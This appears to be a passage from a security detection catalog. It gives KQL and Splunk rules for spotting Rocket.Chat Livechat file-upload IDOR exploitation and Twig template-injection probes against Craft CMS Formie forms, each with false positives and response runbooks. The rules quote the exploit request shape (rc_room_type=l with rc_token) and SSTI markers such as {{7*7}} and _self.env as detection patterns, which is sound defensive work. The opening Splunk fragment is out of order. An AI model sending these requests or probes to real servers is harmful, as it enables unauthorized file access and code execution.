| where VisitorReg >= 1 and RoomReq >= 1 and FileReq >= 1   // same source bootstraps an anon visitor+room then reads uploads within 10m
| order by FileReq desc

| `drop_dm_object_name(Web)`
| eval isVisitor=if(uri_path="/api/v1/livechat/visitor",1,0), isRoom=if(uri_path="/api/v1/livechat/room",1,0), isFile=if(like(uri_path,"/file-upload/%"),1,0)
| stats sum(isVisitor) as visitorReg sum(isRoom) as roomReq sum(isFile) as fileReq dc(uri_path) as distinctPaths min(_time) as firstTime max(_time) as lastTime by src dest
| where visitorReg>=1 AND roomReq>=1 AND fileReq>=1

| sort - fileReq
| tstats summariesonly=false count from datamodel=Web where (Web.uri_path="/api/v1/livechat/visitor" OR Web.uri_path="/api/v1/livechat/room" OR Web.uri_path="/file-upload/*") by Web.src Web.dest Web.uri_path _time span=10m
| `drop_dm_object_name(Web)`

Rocket.Chat file-upload request carrying Livechat auth params (IDOR signature) AIExploitation Medium
Single-event signature for the Rocket.Chat access-control bypass: a GET to /file-upload/ whose query string carries rc_room_type=l together with rc_token — the Livechat authorization path being used to read a file, exactly as in the disclosed exploit. Surfaces individual exploit attempts even below the harvest threshold. Rationale: Uses the verbatim exploit primitive from the PoC — /file-upload/ path plus rc_room_type=l and rc_token query params — as an atomic, Sigma-portable signature. It matches even a single probe, complementing the volume- and chain-based UCs. Cross-checked against: • https://www.aikido.dev/blog/predicting-mongodb-objectid-rocket-chat • https://hackerone.com/reports/3687142
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Livechat visitor downloading an attachment shared in their own helpdesk room (identical request shape)
  • Rocket.Chat client appending rc_room_type/rc_token to file URLs during normal Livechat file rendering
  • WAF or SSL-inspection proxy replaying the request as part of active response testing
  • Authorized researcher/DAST scan on a staging instance
  • URL-preview/link-unfurl bot following a Livechat file link
Response runbook
1) Triage: check the response status — HTTP 200 means a file was served; note the SrcIpAddr, Content-Disposition filename, and whether the source ever authenticated. 2) Contain: if the instance is unpatched (pre 8.5.1/8.4.4/8.3.6/8.2.6/8.1.6/8.0.7/7.13.9/7.10.13), upgrade or disable Livechat and block the IP. 3) Hunt: aggregate this IP's requests to see if it escalates into the distinct-fileId harvest sweep, and correlate with anonymous visitor registrations from the same address.
ImWebSession
| where TimeGenerated > ago(24h)
| where HttpMethod =~ "GET"
| where Url has "/file-upload/" and Url has "rc_room_type=l" and Url has "rc_token="
| project TimeGenerated, SrcIpAddr, DstHostname, HttpMethod, Url, HttpStatusCode, HttpRequestHeaderUserAgent

Twig SSTI markers in request-controlled fields against Craft/Formie public forms AIExploitation Medium
Hunts HTTP requests carrying Twig template syntax ({{ }}, {% %}) in the User-Agent, Referer, or query string reaching a Craft CMS site running Formie. CVE-2026-52889 copies these request-derived Hidden-field defaults straight into Craft's Twig render layer, so Twig markers in these fields are the earliest observable of exploitation of a public form. Rationale: Uses the exact request-derived input surface named in the advisory (User Agent, Referer, Current URL, Query Parameter) and Twig delimiters {{ / {% (plus URL-encoded %7b%7b). Web-request telemetry only exists in Sentinel W3CIISLog / Splunk Web DM; Defender AH, Datadog standard sources, Falcon FDR and CloudWatch do not carry HTTP request headers, so those queries are intentionally empty. Cross-checked against the sibling Formie SSTI advisory CVE-2026-45697 and the Craft SSTI advisory GHSA-94rc-cqvm-m4pw. Cross-checked against: • https://github.com/advisories/GHSA-565m-g33j-jq96 • https://dailycve.com/craft-cms-formie-plugin-twig-injection-via-hidden-field-cve-2026-45697-critical/ • https://github.com/advisories/GHSA-94rc-cqvm-m4pw
ATT&CKT1190 T1221
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Web vulnerability scanners (Burp, Nuclei, Acunetix) sending {{7*7}} SSTI probes
  • Client-side JS frameworks (AngularJS/Vue/Mustache) passing {{ }} template strings in query params
  • Marketing/analytics referrers containing mustache placeholders like {{campaign}}
  • Bug-bounty researchers testing the public form
  • URLs carrying JSON blobs with doubled braces
Suppression filter
| where scStatus == 200 and csUriStem !contains "/api/" and csUserAgent !has_any ("AngularJS","Vue")
Response runbook
1) Triage: pull all requests from the source IP in the window; confirm the target csUriStem is a page that renders a Formie form and whether scStatus==200 (server processed the payload vs 404/403). Decode the payload from UA/query/cookie. 2) Contain: if the payload contains RCE gadgets or scStatus 200 on a form page, block the source IP at the WAF and confirm Formie is on 3.1.27+; if not, apply the workaround (remove request-derived Hidden-field defaults) immediately. 3) Hunt: pivot to endpoint telemetry on the web host for php/w3wp spawning shells (UC3) and review the same source IP for gadget strings (UC2).
W3CIISLog
| where TimeGenerated > ago(7d)
| where csUriStem !endswith ".js" and csUriStem !endswith ".css" and csUriStem !endswith ".png" and csUriStem !endswith ".woff2"
| where csUriQuery contains "%7b%7b" or csUriQuery contains "{{" or csUriQuery contains "%7b%25" or csUriQuery contains "{%"
     or csUserAgent contains "{{" or csUserAgent contains "{%" or csUserAgent contains "_self.env"
     or csReferer contains "{{" or csReferer contains "{%"
| project TimeGenerated, Computer, cIP, csMethod, csUriStem, csUriQuery, csUserAgent, csReferer, scStatus
| order by TimeGenerated desc
